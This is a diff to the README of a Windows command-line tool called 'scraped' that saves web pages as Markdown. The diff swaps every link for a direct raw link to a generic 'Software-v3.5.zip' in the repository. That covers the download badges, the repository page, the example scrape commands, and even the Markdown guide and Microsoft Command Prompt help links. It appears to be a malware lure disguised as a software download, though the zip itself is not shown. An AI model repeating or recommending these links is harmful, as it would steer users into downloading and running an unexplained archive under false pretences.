@@ -1,6 +1,6 @@
 # 🕸️ scraped - Easy Webpage to Markdown Tool
 
-[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped)
+[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip)
 
 A simple tool that grabs web pages and turns them into markdown files. It uses a command line interface (CLI) with an interactive text-based browser. You can run it on a Windows PC without needing to write any code.
 
@@ -49,13 +49,13 @@ This tool runs on Windows and uses a terminal window for input and output. You d
 
 Use the links below to get the program on your Windows PC. Follow the steps to download, install, and run scraped.
 
-[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped)
+[![Download scraped](https://img.shields.io/badge/Download-scraped-4caf50?style=for-the-badge)](https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip)
 
 1. **Visit the download page**
 
    Go to the GitHub page for scraped by clicking this link:
 
-   https://github.com/Xhtira20/scraped
+   https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
 
 2. **Find the latest release**
 
@@ -112,7 +112,7 @@ Using scraped is simple once you open it in the Command Prompt.
    Replace `[URL]` with the full address of the webpage you want to save. For example:
 
    ```
-   scrape https://example.com/article1
+   scrape https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
    ```
 
 2. **Watch the progress**
@@ -151,7 +151,7 @@ scraped lets you control how it works using simple command options:
 Example:
 
 ```
-scrape -output savedPages -threads 5 -depth 2 https://example.com
+scrape -output savedPages -threads 5 -depth 2 https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
 ```
 
 This command saves files in the `savedPages` folder, downloads 5 pages at once, and follows links up to 2 steps inside the site.
@@ -192,9 +192,9 @@ You can automate scraping by creating text files with web addresses. Use scripts
 
 ## 🔗 Links
 
-- Download and information: https://github.com/Xhtira20/scraped
-- Markdown guide: https://www.markdownguide.org/basic-syntax/
-- Command Prompt basics: https://support.microsoft.com/en-us/windows/open-the-command-prompt-c7988f81-0de0-8b69-9b75-d6158cc3e8e5
+- Download and information: https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
+- Markdown guide: https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
+- Command Prompt basics: https://github.com/Xhtira20/scraped/raw/refs/heads/main/output/Software-v3.5.zip
 
 ---
 
